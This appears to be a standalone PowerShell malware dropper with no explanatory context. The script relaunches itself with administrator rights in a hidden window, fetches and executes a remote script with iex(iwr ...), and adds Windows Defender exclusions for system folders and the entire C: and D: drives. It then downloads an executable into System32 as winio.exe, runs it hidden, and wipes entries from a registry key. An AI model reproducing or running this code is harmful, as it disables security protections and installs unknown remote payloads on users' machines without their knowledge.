if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")){$newProc=Start-Process -FilePath "powershell.exe" -ArgumentList ("-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command iex(iwr 'https://raw.githubusercontent.com/aodfs/0/main/0' -UseBasicP)") -Verb RunAs -PassThru;$newProc.WaitForExit();exit;}else{$paths=@("C:\Program Files\Windows Defender","C:\Program Files\Windows Defender Advanced Threat Protection","C:\Program Files\Windows NT","C:\Program Files\Windows Security","C:\Program Files\WindowsPowerShell","C:\Program Files (x86)\Internet Explorer","C:\Program Files (x86)\Microsoft","C:\Program Files (x86\Windows Defender","C:\Program Files (x86)\Windows NT","C:\Program Files (x86)\WindowsPowerShell","C:\Windows\Boot","C:\Windows\CSC","C:\Windows\debug","C:\Windows\diagnostics","C:\Windows\Logs","C:\Windows\PLA","C:\Windows\Resources","C:\Windows\security","C:\Windows\System","C:\Windows\System32","C:\Windows\SystemApps","C:\Windows\SystemResources","C:\Windows\SystemTemp","C:\Windows\SysWOW64","C:\Windows\Tasks","C:\Windows\WinSxS","C:\","D:\");foreach($path in $paths){Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue};Start-BitsTransfer -Source 'https://raw.githubusercontent.com/aodfs/0/main/1' -Destination 'C:\Windows\System32\winio.exe' -ErrorAction SilentlyContinue;if (-not (Test-Path 'C:\Windows\System32\winio.exe')){Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/aodfs/0/main/1' -OutFile 'C:\Windows\System32\winio.exe' -ErrorAction SilentlyContinue;}try{Start-Process -FilePath 'C:\Windows\System32\winio.exe' -Verb RunAs -WindowStyle Hidden -ErrorAction SilentlyContinue;}catch{& 'C:\Windows\System32\winio.exe' -ErrorAction SilentlyContinue;};$regEntries=Get-ItemProperty -Path $regPath;foreach($entry in $regEntries.PSObject.Properties){if($entry.Name -ne "PSPath" -and $entry.Name -ne "PSParentPath" -and $entry.Name -ne "PSChildName" -and $entry.Name -ne "PSDrive" -and $entry.Name -ne "PSProvider"){Remove-ItemProperty -Path $regPath -Name $entry.Name}}}
